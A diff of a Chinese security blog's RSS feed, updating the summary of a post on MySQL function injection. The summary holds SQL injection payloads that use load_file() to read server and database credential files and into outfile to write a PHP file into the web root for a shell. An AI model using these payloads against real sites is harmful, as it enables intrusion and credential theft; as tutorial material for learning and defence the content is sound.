@@ -1556,14 +1556,12 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
       <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
       
       <guid>http://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
-      <description>0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
+      <description>0x00 load_file() 读文件  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
  读/etc/init.d下的东西，这里有配置文件路径
 ?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
 ?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)  读取密码文件
-?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
-当知道路径时，可以直接用  id=1 union select &amp;quot;&amp;lt;? phpinfo();&amp;gt;&amp;quot; into outfile(&amp;quot;C:/phpStudy/WWW/a.php&amp;quot;)
-或者
-id=1 into outfile &#39;C:/phpStudy/WWW/a.</description>
+?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 into outfile getshell  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
+当知道路径时，可以直接用  id=1 union select &amp;quot;&amp;lt;? phpinfo();&amp;gt;&amp;quot; into outfile(&amp;quot;C:/phpStudy/WWW/a.php&amp;quot;) id=1 into outfile &#39;C:/phpStudy/WWW/a.</description>
     </item>
     
     <item>
